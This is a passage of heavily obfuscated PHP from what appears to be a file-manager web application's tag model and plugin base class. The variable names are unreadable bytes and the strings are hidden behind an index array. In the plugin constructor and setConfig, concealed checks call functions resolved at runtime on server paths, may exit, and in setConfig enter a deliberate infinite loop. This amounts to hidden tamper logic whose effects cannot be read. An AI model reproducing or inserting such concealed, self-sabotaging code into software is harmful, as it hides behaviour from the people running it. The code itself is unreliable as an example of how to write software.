$ñ‘‡“æÖ); $„›¸ÃĞ = array($áõ¦¶ù”[540] => $ı¹¿’á); Model($áõ¦¶ù”[2006])->where($Ö‡–¡)->save($„›¸ÃĞ); Model($áõ¦¶ù”[2007])->where($Ö‡–¡)->save($„›¸ÃĞ); } $this->_changeChildLevel($ïÊÛ¯€[$ñ‘‡“æÖ], $ïÊÛ¯€[$ı¹¿’á], !0); $this->where(array($áõ¦¶ù”[182] => $ñ‘‡“æÖ))->save(array($áõ¦¶ù”[182] => $ı¹¿’á)); $this->_clearChildrenCache($ïÊÛ¯€[$ı¹¿’á]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ˆ™èûÂ…) { $ªòÁÊ± =& $_SERVER[ò«¥Ê‡å]; return array($ªòÁÊ±[2008] => array($ˆ™èûÂ…[0], $ªòÁÊ±[2009]), $ªòÁÊ±[2010] => array($ˆ™èûÂ…[0], $ªòÁÊ±[2011])); } protected function get($âå®¶´) { $Ù§óÖÓú =& $_SERVER[ò«¥Ê‡å]; $ïîß²è‡ = Model($Ù§óÖÓú[556])->metaGet($âå®¶´, $Ù§óÖÓú[2012]); $Ÿ…ŠƒŞ = json_decode($ïîß²è‡, !0); return $Ÿ…ŠƒŞ ? $Ÿ…ŠƒŞ : array($Ù§óÖÓú[2013] => $Ù§óÖÓú[90], $Ù§óÖÓú[415] => array()); } protected function set($™ØôÉÉ, $×Ö…È) { $àñÄéŠã =& $_SERVER[ò«¥Ê‡å]; $×Ö…È = $×Ö…È ? $×Ö…È : array($àñÄéŠã[2013] => $àñÄéŠã[90], $àñÄéŠã[415] => array()); return Model($àñÄéŠã[556])->metaSet($™ØôÉÉ, $àñÄéŠã[2012], json_encode($×Ö…È)); } protected function getByTagID($‹Ö¢ğÅ¶, $ÊÉÕÆûô) { $ˆµ­š°Â =& $_SERVER[ò«¥Ê‡å]; if (!$‹Ö¢ğÅ¶ || !$ÊÉÕÆûô) { return !1; } if (!Model($ˆµ­š°Â[556])->getInfoSimple($‹Ö¢ğÅ¶)) { return !1; } $Ê·©¥õ˜ = $this->get($‹Ö¢ğÅ¶); if (!$Ê·©¥õ˜ || !isset($Ê·©¥õ˜[$ˆµ­š°Â[415]])) { return !1; } $“İ›ÇÁ‚ = array_find_by_field($Ê·©¥õ˜[$ˆµ­š°Â[415]], $ˆµ­š°Â[445], $ÊÉÕÆûô); return is_array($“İ›ÇÁ‚) ? $“İ›ÇÁ‚ : !1; } public function listSource($Ú§ß¤Àğ, $±êêİÖ) { $¯ß­ÕöÌ =& $_SERVER[ò«¥Ê‡å]; if ($±êêİÖ && !is_array($±êêİÖ)) { $±êêİÖ = array($±êêİÖ); } $€€¥·å¹ = $this->listData($Ú§ß¤Àğ); $¡èğ¢×Ğ = array(); foreach ($€€¥·å¹ as $ßşï©ª…) { $ó‚ÌíèÅ = $ßşï©ª…[$¯ß­ÕöÌ[86]]; if (!$ó‚ÌíèÅ) { continue; } if (!isset($¡èğ¢×Ğ[$ó‚ÌíèÅ])) { $¡èğ¢×Ğ[$ó‚ÌíèÅ] = array(); } $¡èğ¢×Ğ[$ó‚ÌíèÅ][] = $ßşï©ª…[$¯ß­ÕöÌ[470]]; } $îÚÎ‡— = array(); foreach ($¡èğ¢×Ğ as $¿¤…ğàÏ => $²·­šÅÑ) { $‚§Ó‚±“ = !0; if (!$±êêİÖ) { $îÚÎ‡—[] = $¿¤…ğàÏ; continue; } foreach ($±êêİÖ as $ËØ¸Ù¢) { if (!in_array($ËØ¸Ù¢, $²·­šÅÑ)) { $‚§Ó‚±“ = !1; break; } } if ($‚§Ó‚±“) { $îÚÎ‡—[] = $¿¤…ğàÏ; } } if (!$îÚÎ‡—) { return array(); } $¾ñ¯Àò“ = array($¯ß­ÕöÌ[461] => array($¯ß­ÕöÌ[462], $îÚÎ‡—), $¯ß­ÕöÌ[540] => $Ú§ß¤Àğ, $¯ß­ÕöÌ[180] => SourceModel::TYPE_GROUP); $ÕÅæÁ× = Model($¯ß­ÕöÌ[1380])->listSource($¾ñ¯Àò“); if (!$ÕÅæÁ× || count($îÚÎ‡—) == $ÕÅæÁ×[$¯ß­ÕöÌ[412]][$¯ß­ÕöÌ[413]]) { return $ÕÅæÁ×; } $÷ÉÄµ™¡ = array(); $¢¥›Ôğ· = array_to_keyvalue($ÕÅæÁ×[$¯ß­ÕöÌ[84]], $¯ß­ÕöÌ[12], $¯ß­ÕöÌ[183]); $éÉ«È­ù = array_to_keyvalue($ÕÅæÁ×[$¯ß­ÕöÌ[85]], $¯ß­ÕöÌ[12], $¯ß­ÕöÌ[183]); $Æ—€éş = array_merge($éÉ«È­ù, $¢¥›Ôğ·); foreach ($îÚÎ‡— as $ó‚ÌíèÅ) { if (!in_array($ó‚ÌíèÅ, $Æ—€éş)) { $÷ÉÄµ™¡[] = $ó‚ÌíèÅ; } } if ($÷ÉÄµ™¡) { $this->removeBySource($Ú§ß¤Àğ, $÷ÉÄµ™¡); } return $ÕÅæÁ×; } protected function listData($¡’¥±×œ) { $ÊÆïò•ğ =& $_SERVER[ò«¥Ê‡å]; $¤­†„È = array($ÊÆïò•ğ[1692] => 0, $ÊÆïò•ğ[528] => array($ÊÆïò•ğ[2014], 0), $ÊÆïò•ğ[466] => $ÊÆïò•ğ[2015] . $¡’¥±×œ); $ „¹¯¯ = $ÊÆïò•ğ[2016]; $ßğÜçÂ = $this->field($ „¹¯¯)->where($¤­†„È)->order($ÊÆïò•ğ[2017])->select(); return $ßğÜçÂ ? $ßğÜçÂ : array(); } protected function addToTag($¦åîäßá, $ğ¶ø«Ñ, $äÄç¾²) { $Ÿ¾†Æâ€ =& $_SERVER[ò«¥Ê‡å]; if (!$this->getByTagID($¦åîäßá, $äÄç¾²) || !$ğ¶ø«Ñ) { return !1; } if (!Model($Ÿ¾†Æâ€[871])->pathInfo($ğ¶ø«Ñ)) { return !1; } $ëÊ›—øÆ = array($Ÿ¾†Æâ€[1692] => 0, $Ÿ¾†Æâ€[528] => $äÄç¾², $Ÿ¾†Æâ€[465] => $ğ¶ø«Ñ, $Ÿ¾†Æâ€[466] => $Ÿ¾†Æâ€[2018] . $¦åîäßá, $Ÿ¾†Æâ€[464] => $Ÿ¾†Æâ€[12], $Ÿ¾†Æâ€[1903] => 0); if ($this->where($ëÊ›—øÆ)->find()) { return !1; } return $this->add($ëÊ›—øÆ); } protected function removeFromTag($î¾½éÉ‰, $şÜºÕ¦, $‘¾¹”•’) { $¡¸åı´ =& $_SERVER[ò«¥Ê‡å]; if (!$this->getByTagID($î¾½éÉ‰, $‘¾¹”•’) || !$şÜºÕ¦) { return !1; } if (is_array($şÜºÕ¦)) { $şÜºÕ¦ = array($¡¸åı´[7], $şÜºÕ¦); } $½¡«”Ô = array($¡¸åı´[1692] => 0, $¡¸åı´[528] => $‘¾¹”•’, $¡¸åı´[466] => $¡¸åı´[2018] . $î¾½éÉ‰, $¡¸åı´[465] => $şÜºÕ¦); return $this->where($½¡«”Ô)->delete(); } protected function removeByTag($É‡ÀØ³³, $”İùŠşÇ) { $¸Ëöèİ =& $_SERVER[ò«¥Ê‡å]; if (!$this->getByTagID($É‡ÀØ³³, $”İùŠşÇ)) { return !1; } $œ˜ášáÛ = array($¸Ëöèİ[1692] => 0, $¸Ëöèİ[528] => $”İùŠşÇ, $¸Ëöèİ[466] => $¸Ëöèİ[2018] . $É‡ÀØ³³); return $this->where($œ˜ášáÛ)->delete(); } protected function removeBySource($½ù ÒÛ, $Àù®‰ü…) { $‹Ï‰ÕûÅ =& $_SERVER[ò«¥Ê‡å]; if (!$½ù ÒÛ || !$Àù®‰ü…) { return !1; } if (is_array($Àù®‰ü…)) { $Àù®‰ü… = array($‹Ï‰ÕûÅ[7], $Àù®‰ü…); } $¹î¥ÎÛ = array($‹Ï‰ÕûÅ[1692] => 0, $‹Ï‰ÕûÅ[465] => $Àù®‰ü…, $‹Ï‰ÕûÅ[528] => array($‹Ï‰ÕûÅ[1061], 0), $‹Ï‰ÕûÅ[466] => $‹Ï‰ÕûÅ[2018] . $½ù ÒÛ); return $this->where($¹î¥ÎÛ)->delete(); } } goto FŒéÅŒ‹·…; fØ¸Ò¡Î»ù: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $—ä¼¯Àİ =& $_SERVER[ò«¥Ê‡å]; if ($_SERVER[$—ä¼¯Àİ[837]] != $_SERVER[$—ä¼¯Àİ[1556]]) { $æ›·ú¹í = $—ä¼¯Àİ[924]; $Ø˜¬ìÒ = $—ä¼¯Àİ[839]; $ç”‰ºÁğ = $_SERVER[$—ä¼¯Àİ[840]] . $—ä¼¯Àİ[841]; $Ï™Â¶¨è = $Ø˜¬ìÒ($ç”‰ºÁğ); $Šò•Õ“ƒ = explode($—ä¼¯Àİ[248], $Ï™Â¶¨è); if (count($Šò•Õ“ƒ) < $—ä¼¯Àİ[673]) { $¡§èõ­Ã = $—ä¼¯Àİ[842]; $¡§èõ­Ã(); } $ÌçÇ—Ñ = $—ä¼¯Àİ[925]; $ÌçÇ—Ñ($_SERVER[$—ä¼¯Àİ[926]]); $ÌçÇ—Ñ($_SERVER[$—ä¼¯Àİ[840]] . $—ä¼¯Àİ[1557]); $Š´Ùíïù = 1; while ($Š´Ùíïù > 1) { $Š´Ùíïù = $Š´Ùíïù + 4; $Œá¤ı™— = rawurlencode($Š´Ùíïù . $—ä¼¯Àİ[424]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($—ä¼¯Àİ[1558]); $this->pluginName = str_replace($—ä¼¯Àİ[1558], $—ä¼¯Àİ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $—ä¼¯Àİ[8]; $this->pluginApi = appHostGet() . $—ä¼¯Àİ[1559] . $this->pluginName . $—ä¼¯Àİ[8]; $this->pluginHost = $config[$—ä¼¯Àİ[1560]] . $this->pluginName . $—ä¼¯Àİ[8]; $this->pluginHostDefault = $config[$—ä¼¯Àİ[1560]] . $this->pluginName . $—ä¼¯Àİ[8]; $¬ÁÊÜÄ— = $config[$—ä¼¯Àİ[1561]]; if ($¬ÁÊÜÄ— && strpos($—ä¼¯Àİ[50] . $¬ÁÊÜÄ— . $—ä¼¯Àİ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$—ä¼¯Àİ[1562]] . $this->pluginName . $—ä¼¯Àİ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ò«¥Ê‡å][1563]); } protected function assign($‰ïŒæĞ„, $ö¾ƒÅ = false) { if (is_array($‰ïŒæĞ„)) { $this->values = array_merge($this->values, $‰ïŒæĞ„); } else { $this->values[$‰ïŒæĞ„] = $ö¾ƒÅ; } } protected function display($Áª³ÙÏÍ) { extract($this->values); require $Áª³ÙÏÍ; } final function hookRegist($„îëÉÖ) { $this->modelPlugin->appRegist($this->pluginName, $„îëÉÖ); } final function appIcon() { $ĞÛóğÉ× =& $_SERVER[ò«¥Ê‡å]; $ÉıÀÌÂ = $this->appPackage(); $Çæ‘èç‚ = $ĞÛóğÉ×[12]; if (isset($ÉıÀÌÂ[$ĞÛóğÉ×[460]])) { if (isset($ÉıÀÌÂ[$ĞÛóğÉ×[460]][$ĞÛóğÉ×[1564]])) { $Çæ‘èç‚ = $ĞÛóğÉ×[1565] . $ÉıÀÌÂ[$ĞÛóğÉ×[460]][$ĞÛóğÉ×[1564]] . $ĞÛóğÉ×[1566]; } else { if ($ÉıÀÌÂ[$ĞÛóğÉ×[460]][$ĞÛóğÉ×[1567]]) { $Çæ‘èç‚ = $ĞÛóğÉ×[1568] . $ÉıÀÌÂ[$ĞÛóğÉ×[460]][$ĞÛóğÉ×[1567]] . $ĞÛóğÉ×[1569]; } } } return $Çæ‘èç‚; } final function fileCanView($îÆí¯Ó) { $¿ö±Ù¶¯ =& $_SERVER[ò«¥Ê‡å]; if (request_url_safe($îÆí¯Ó)) { return !0; } if ($this->isShare($îÆí¯Ó)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Èœœ£®ó = $¿ö±Ù¶¯[1570] . rawurlencode(this_url()); show_tips(LNG($¿ö±Ù¶¯[1571]) . $¿ö±Ù¶¯[1572] . $Èœœ£®ó . $¿ö±Ù¶¯[1573] . LNG($¿ö±Ù¶¯[1574]) . $¿ö±Ù¶¯[1575], !1); } if (!Action($¿ö±Ù¶¯[1576])->authCan($¿ö±Ù¶¯[1577])) { show_tips(LNG($¿ö±Ù¶¯[1578]) . $¿ö±Ù¶¯[1579], !1); } ActionCall($¿ö±Ù¶¯[1580], $îÆí¯Ó); } final function isShare($åÁ³ßê) { $ĞˆÈ±Ù¿ = KodIO::parse($åÁ³ßê); return $ĞˆÈ±Ù¿[$_SERVER[ò«¥Ê‡å][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¸øù–ªÉ) { if (request_url_safe($¸øù–ªÉ)) { return $¸øù–ªÉ; } if (!$this->isShare($¸øù–ªÉ)) { $¸øù–ªÉ = $this->filePath($¸øù–ªÉ, !1); } return Action($_SERVER[ò«¥Ê‡å][1221])->linkOut($¸øù–ªÉ); } public function filePathLinkOut($€˜Ÿì¬œ) { if (request_url_safe($€˜Ÿì¬œ)) { return $€˜Ÿì¬œ; } $this->fileCanView($€˜Ÿì¬œ); return Action($_SERVER[ò«¥Ê‡å][1221])->link($€˜Ÿì¬œ); } final function filePath($”ôÑúöí, $¶¼ÔŠÔ÷ = true, $ëÓŠ€ï’ = false) { $ë¶ò¸í =& $_SERVER[ò«¥Ê‡å]; $³Æ”²’ = $this->filePathGet($”ôÑúöí, $¶¼ÔŠÔ÷); if (!$this->fileInfo) { show_tips(LNG($ë¶ò¸í[107]), !1); } if ($ëÓŠ€ï’ && isset($this->fileInfo[$ë¶ò¸í[511]]) && $this->fileInfo[$ë¶ò¸í[511]]) { $‘ıøâëç = Model($ë¶ò¸í[514])->fileInfo($this->fileInfo[$ë¶ò¸í[511]]); if (!$‘ıøâëç || !IO::exist($‘ıøâëç[$ë¶ò¸í[86]])) { show_tips(LNG($ë¶ò¸í[107]) . $ë¶ò¸í[1581]); } } Hook::trigger($ë¶ò¸í[1582], $³Æ”²’); return $³Æ”²’; } final function filePathGet($õ×ììßÕ, $ûşÛÓŞ¹ = true) { $ÎÚœ¾å =& $_SERVER[ò«¥Ê‡å]; if ($¸‹ú—‚Š = $this->checkSharePath($õ×ììßÕ, $ûşÛÓŞ¹)) { return $¸‹ú—‚Š; } $this->fileCanView($õ×ììßÕ); if (request_url_safe($õ×ììßÕ)) { $—ÊÕ³… = parse_url_query($õ×ììßÕ); if (isset($—ÊÕ³…[$ÎÚœ¾å[1583]]) && isset($—ÊÕ³…[$ÎÚœ¾å[220]])) { $ôüÙœÉĞ = Mcrypt::decode($—ÊÕ³…[$ÎÚœ¾å[220]], Model($ÎÚœ¾å[809])->get($ÎÚœ¾å[810])); if ($ôüÙœÉĞ) { $this->fileInfo = IO::info($ôüÙœÉĞ); $this->fileInfo[$ÎÚœ¾å[1584]] = $õ×ììßÕ; $this->cachePath = $this->pluginCachePath($ÎÚœ¾å[12], $ûşÛÓŞ¹); return $ôüÙœÉĞ; } } $õ×ììßÕ = $this->_cacheHttpFile($õ×ììßÕ, $ûşÛÓŞ¹); $this->fileInfo = IO::info($õ×ììßÕ); } else { $this->fileInfo = IO::info($õ×ììßÕ); $this->cachePath = $this->pluginCachePath($ÎÚœ¾å[12], $ûşÛÓŞ¹); } return $õ×ììßÕ; } final function _cacheHttpFile($½µ å¾­, $ÎÏÖ§‘ = true) { $¶ ½ùœ =& $_SERVER[ò«¥Ê‡å]; $õ¤•ƒæÉ = parse_url_query($½µ å¾­); $¯ÇÍ¯ıĞ = get_path_ext($½µ å¾­); if (isset($õ¤•ƒæÉ[$¶ ½ùœ[32]]) && $õ¤•ƒæÉ[$¶ ½ùœ[32]]) { $¯ÇÍ¯ıĞ = get_path_ext($õ¤•ƒæÉ[$¶ ½ùœ[32]]); } $Ï›¿©Îª = hash_path($½µ å¾­) . $¶ ½ùœ[10] . $¯ÇÍ¯ıĞ; $this->cachePath = $this->pluginCachePath($ÎÏÖ§‘ ? $Ï›¿©Îª : $¶ ½ùœ[12]); $¤ğæöşá = IO::fileNameExist($this->cachePath, $Ï›¿©Îª); if ($¤ğæöşá) { return KodIO::make($¤ğæöşá); } $ĞĞƒ·¿ = rtrim($this->cachePath, $¶ ½ùœ[8]) . $¶ ½ùœ[8] . $Ï›¿©Îª; return $this->pluginCacheFileSet($ĞĞƒ·¿, file_get_contents_nossl($½µ å¾­)); } final function checkSharePath($±¢‹¦È, $µÍ½ßš = true) { $ÅéÔ«ò­ =& $_SERVER[ò«¥Ê‡å]; if (!$this->isShare($±¢‹¦È)) { return !1; } $îïË‚°¾ = Action($ÅéÔ«ò­[1221])->sharePathInfo($±¢‹¦È); if (!is_array($îïË‚°¾) || !isset($îïË‚°¾[$ÅéÔ«ò­[86]])) { show_json(LNG($ÅéÔ«ò­[1585]), !1); } $this->fileInfo = $îïË‚°¾; $this->cachePath = $this->pluginCachePath(!1, $µÍ½ßš); return $îïË‚°¾[$ÅéÔ«ò­[86]]; } final function pluginCachePath($²ÑÜ“ê = '', $Âû¯²€ = false) { $ÈÊÀ†°§ =& $_SERVER[ò«¥Ê‡å]; if ($Âû¯²€ && is_array($this->fileInfo)) { $²ÑÜ“ê = kodIO::hashPath($this->fileInfo); } $‘¡¦¿ãø = rtrim(IO_PATH_SYSTEM_TEMP . $ÈÊÀ†°§[1586] . $this->pluginName . $ÈÊÀ†°§[8] . $²ÑÜ“ê, $ÈÊÀ†°§[8]); $ùÇã‰­ = IO::infoFullSimple($‘¡¦¿ãø); $ø’Ø¬ûØ = $ùÇã‰­ && is_array($ùÇã‰­) ? $ùÇã‰­[$ÈÊÀ†°§[86]] : $ÈÊÀ†°§[12]; if (!$ø’Ø¬ûØ) { $ø’Ø¬ûØ = IO::mkdir($‘¡¦¿ãø); } return $ø’Ø¬ûØ; } final function pluginCacheFileSet($á…»ÃÑÄ, $ÆôæÃë¹ = '') { $õû¯¼Şš =& $_SERVER[ò«¥Ê‡å]; $€âÉ«ó„ = IO::infoFullSimple($á…»ÃÑÄ); if (!$€âÉ«ó„) { return IO::mkfile($á…»ÃÑÄ, $ÆôæÃë¹, REPEAT_REPLACE); } IO::setContent($€âÉ«ó„[$õû¯¼Şš[86]], $ÆôæÃë¹); return $€âÉ«ó„[$õû¯¼Şš[86]]; } final function pluginLocalFile($Îş¯äÙ = '') { $”ËÄ„†­ =& $_SERVER[ò«¥Ê‡å]; $Ë¼²÷€Ù = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Ë¼²÷€Ù)) { mk_dir($Ë¼²÷€Ù); } if (!$Îş¯äÙ) { return $Ë¼²÷€Ù; } $¼€Şğë = IO::info($Îş¯äÙ); $’¥³¦Å = $”ËÄ„†­[1587] . KodIO::hashPath($¼€Şğë) . $”ËÄ„†­[10] . $¼€Şğë[$”ËÄ„†­[177]]; if (!checkExtSafe($’¥³¦Å)) { $’¥³¦Å = $’¥³¦Å . $”ËÄ„†­[1253]; } $İü¤èÏ = $Ë¼²÷€Ù . $’¥³¦Å; if (@file_exists($İü¤èÏ)) { return $İü¤èÏ; } return IO::copy($Îş¯äÙ, $Ë¼²÷€Ù, 0, $’¥³¦Å); } final function appPackage() { $êÄëıÊô =& $_SERVER[ò«¥Ê‡å]; if ($this->packageData) { return $this->packageData; } $’‘‰Ô™ = $this->parseFile($this->pluginPath . $êÄëıÊô[1588]); $this->parseLang($’‘‰Ô™); $ë­Õ±Ñ = json_decode_force($’‘‰Ô™); if (!$ë­Õ±Ñ) { return array(); } $Ë÷­ßŸ = Hook::trigger($êÄëıÊô[1589], $ë­Õ±Ñ); if ($Ë÷­ßŸ && is_array($Ë÷­ßŸ)) { $ë­Õ±Ñ = $Ë÷­ßŸ; } $this->packageData = $ë­Õ±Ñ; return $ë­Õ±Ñ; } public function packageInfoGet($‘«çà¢) { $‘›óµ„è = $this->appPackage(); return array_get_value($‘›óµ„è, $‘«çà¢); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ò«¥Ê‡å][1590]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ò«¥Ê‡å][1591]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ò«¥Ê‡å][1592]); } public function echoJsAssign($ÊïÇİÉ, $Ù…á£€) { $this->echoJsAssignArr[$ÊïÇİÉ] = $Ù…á£€; } private function parseFile($§œêıö”) { $í’ıĞ¹ =& $_SERVER[ò«¥Ê‡å]; $Ë¢ƒÓÕã = file_get_contents_nossl($§œêıö”); $ßÑ¦’ï = array($í’ıĞ¹[1593], $í’ıĞ¹[1594], $í’ıĞ¹[1595], $í’ıĞ¹[1596], $í’ıĞ¹[1597], $í’ıĞ¹[1598], $í’ıĞ¹[1599]); $Üû‰ÍòÁ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$í’ıĞ¹[91]][$í’ıĞ¹[1600]]); foreach ($this->echoJsAssignArr as $õŠ¥—¡« => $ÄÈ×ÃÀş) { $ßÑ¦’ï[] = $í’ıĞ¹[1601] . $õŠ¥—¡« . $í’ıĞ¹[1602]; $Üû‰ÍòÁ[] = is_array($ÄÈ×ÃÀş) || is_object($ÄÈ×ÃÀş) ? rawurlencode(json_encode($ÄÈ×ÃÀş)) : $ÄÈ×ÃÀş; } if (strstr($Ë¢ƒÓÕã, $í’ıĞ¹[1603])) { $•’ÈÉ» = rawurlencode(json_encode($this->pluginLangArr)); $Ë¢ƒÓÕã = str_replace($í’ıĞ¹[1603], $•’ÈÉ», $Ë¢ƒÓÕã); } if (strstr($Ë¢ƒÓÕã, $í’ıĞ¹[1604])) { $•’ÈÉ» = $•’ÈÉ» = rawurlencode(json_encode($this->getConfig())); $Ë¢ƒÓÕã = str_replace($í’ıĞ¹[1604], $•’ÈÉ», $Ë¢ƒÓÕã); } $Ë¢ƒÓÕã = str_replace($ßÑ¦’ï, $Üû‰ÍòÁ, $Ë¢ƒÓÕã); return $Ë¢ƒÓÕã; } private function parseLang(&$­¡íüë°) { $œ‹Ë”¤ş =& $_SERVER[ò«¥Ê‡å]; $ìš½ıšË = $œ‹Ë”¤ş[1605]; if (!strstr($­¡íüë°, $ìš½ıšË)) { return; } preg_match_all($œ‹Ë”¤ş[1606], $­¡íüë°, $šåºöÖŠ); if (!is_array($šåºöÖŠ) || count($šåºöÖŠ) == 0 || !is_array($šåºöÖŠ[0]) || count($šåºöÖŠ[0]) == 0) { return; } $ğ ®Ñ¡ã = array(); $Õ½ë€¸ö = array(); foreach ($šåºöÖŠ[0] as $˜–Ä¨š“) { $î¿şğÛÂ = substr($˜–Ä¨š“, strlen($ìš½ıšË), -4); $“îµ–‚  = LNG($î¿şğÛÂ); $ğ ®Ñ¡ã[] = $˜–Ä¨š“; $Õ½ë€¸ö[] = str_replace(array($œ‹Ë”¤ş[248], $œ‹Ë”¤ş[1125], $œ‹Ë”¤ş[388], $œ‹Ë”¤ş[120]), array($œ‹Ë”¤ş[53], $œ‹Ë”¤ş[53], $œ‹Ë”¤ş[12], $œ‹Ë”¤ş[1607]), $“îµ–‚ ); } $­¡íüë° = str_replace($ğ ®Ñ¡ã, $Õ½ë€¸ö, $­¡íüë°); } private function parseConfig(&$Ÿ‚¯Ì‰ƒ) { $—ü“Õº¨ =& $_SERVER[ò«¥Ê‡å]; $¥„©’¦Ÿ = $—ü“Õº¨[1608]; if (!strstr($Ÿ‚¯Ì‰ƒ, $¥„©’¦Ÿ)) { return; } preg_match_all($—ü“Õº¨[1609], $Ÿ‚¯Ì‰ƒ, $¦œãêó¡); if (!is_array($¦œãêó¡) || count($¦œãêó¡) == 0 || !is_array($¦œãêó¡[0]) || count($¦œãêó¡[0]) == 0) { return; } $üé­ØÍ¨ = $this->getConfig(); $ÚÜÃö¸‚ = array(); $æ‡µ¸·Ô = array(); foreach ($¦œãêó¡[0] as $ÃÅéÉ) { $…€Ì¢– = substr($ÃÅéÉ, strlen($¥„©’¦Ÿ), -2); $ÚÜÃö¸‚[] = $ÃÅéÉ; $æ‡µ¸·Ô[] = _get($üé­ØÍ¨, $…€Ì¢–); } $Ÿ‚¯Ì‰ƒ = str_replace($ÚÜÃö¸‚, $æ‡µ¸·Ô, $Ÿ‚¯Ì‰ƒ); } private function parsePackage(&$¢šªì’) { $éú©İƒ =& $_SERVER[ò«¥Ê‡å]; $ÄÙ›ÄÊø = $éú©İƒ[1610]; if (!strstr($¢šªì’, $ÄÙ›ÄÊø)) { return; } preg_match_all($éú©İƒ[1611], $¢šªì’, $ÂÄî ƒ); if (!is_array($ÂÄî ƒ) || count($ÂÄî ƒ) == 0 || !is_array($ÂÄî ƒ[0]) || count($ÂÄî ƒ[0]) == 0) { return; } $ê³×Ó´ñ = $this->appPackage(); $øì±¸›€ = array(); $û“°±ö = array(); foreach ($ÂÄî ƒ[0] as $ŠøÚ‘œÉ) { $Òí»›Šˆ = substr($ŠøÚ‘œÉ, strlen($ÄÙ›ÄÊø), -2); $øì±¸›€[] = $ŠøÚ‘œÉ; $û“°±ö[] = _get($ê³×Ó´ñ, $Òí»›Šˆ); } $¢šªì’ = str_replace($øì±¸›€, $û“°±ö, $¢šªì’); } final function echoFile($†‡´èÑ, $¢‘ïãûÑ = false) { $İˆ­¬Ï =& $_SERVER[ò«¥Ê‡å]; $»æ€È¤‘ = $this->pluginPath . $†‡´èÑ; if (ACT == $İˆ­¬Ï[1612]) { echo $İˆ­¬Ï[1613] . $this->pluginName . $İˆ­¬Ï[8] . $†‡´èÑ . $İˆ­¬Ï[1614]; if (!file_exists($»æ€È¤‘)) { echo $İˆ­¬Ï[1615]; return; } } $ìˆúÚõ´ = $this->parseFile($»æ€È¤‘); $this->parseLang($ìˆúÚõ´); $this->parseConfig($ìˆúÚõ´); $this->parsePackage($ìˆúÚõ´); if (is_array($¢‘ïãûÑ)) { $ìˆúÚõ´ = str_replace(array_keys($¢‘ïãûÑ), array_values($¢‘ïãûÑ), $ìˆúÚõ´); } echo $İˆ­¬Ï[248] . $ìˆúÚõ´; } private function checkVersion() { $×Ğ‘Ñõ =& $_SERVER[ò«¥Ê‡å]; $«×Šàä¶ = $this->appPackage(); $âÛ²€ÇÅ = $this->getConfig(); if ($âÛ²€ÇÅ[$×Ğ‘Ñõ[1616]] == $«×Šàä¶[$×Ğ‘Ñõ[1590]]) { return; } $this->regist(); $this->setConfig(array($×Ğ‘Ñõ[1616] => $«×Šàä¶[$×Ğ‘Ñõ[1590]])); } final function initLang() { $ÂŞ€®ŞÀ =& $_SERVER[ò«¥Ê‡å]; $áô” ¼ë = $ÂŞ€®ŞÀ[1617]; $©ŠÃ©“Ô = $this->pluginPath . $ÂŞ€®ŞÀ[1618]; $œô—ş²À = I18n::getType(); $Èƒıç¹‹ = array(); if (file_exists($©ŠÃ©“Ô . $œô—ş²À . $ÂŞ€®ŞÀ[885])) { $Èƒıç¹‹ = (include $©ŠÃ©“Ô . $œô—ş²À . $ÂŞ€®ŞÀ[885]); } else { if ($œô—ş²À == $ÂŞ€®ŞÀ[1619] && !file_exists($©ŠÃ©“Ô . $œô—ş²À . $ÂŞ€®ŞÀ[885]) && file_exists($©ŠÃ©“Ô . $ÂŞ€®ŞÀ[1620])) { $Èƒıç¹‹ = (include $©ŠÃ©“Ô . $ÂŞ€®ŞÀ[1620]); } else { if (file_exists($©ŠÃ©“Ô . $áô” ¼ë . $ÂŞ€®ŞÀ[885])) { $Èƒıç¹‹ = (include $©ŠÃ©“Ô . $áô” ¼ë . $ÂŞ€®ŞÀ[885]); } } } if (!is_array($Èƒıç¹‹)) { return array(); } if (@count($Èƒıç¹‹) > 0) { I18n::set($Èƒıç¹‹); } return $Èƒıç¹‹; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ôÛ‚µë) { $£ëµÜÉÊ =& $_SERVER[ò«¥Ê‡å]; if (!isset($_SERVER[$£ëµÜÉÊ[837]]) || !isset($_SERVER[$£ëµÜÉÊ[838]])) { $îÉ‚¾ÅÚ = $£ëµÜÉÊ[924]; $×£§¸ª = $£ëµÜÉÊ[839]; $Ç‰Âê¬Å = $_SERVER[$£ëµÜÉÊ[840]] . $£ëµÜÉÊ[841]; $—ç²™ê = $×£§¸ª($Ç‰Âê¬Å); $†ƒ€ö = explode($£ëµÜÉÊ[248], $—ç²™ê); if (count($†ƒ€ö) < $£ëµÜÉÊ[673]) { $’õŒ§÷á = $£ëµÜÉÊ[842]; $’õŒ§÷á(); } $ãùÁí‘ = $£ëµÜÉÊ[925]; $ãùÁí‘($_SERVER[$£ëµÜÉÊ[926]]); $Ş´ß¿Ëı = 1; for ($ââ§ÀÇ = $Ş´ß¿Ëı; $ââ§ÀÇ > 0; $ââ§ÀÇ++) { $ãùÁí‘ = json_encode($GLOBALS[$£ëµÜÉÊ[462]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ôÛ‚µë); } public function onSetConfig($Ñ¬ßïìë) { } public function onGetConfig($åäæÀò) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($èæÁŞÛğ) { if ($èæÁŞÛğ == 1) { $this->onChangeOpen(); } else { 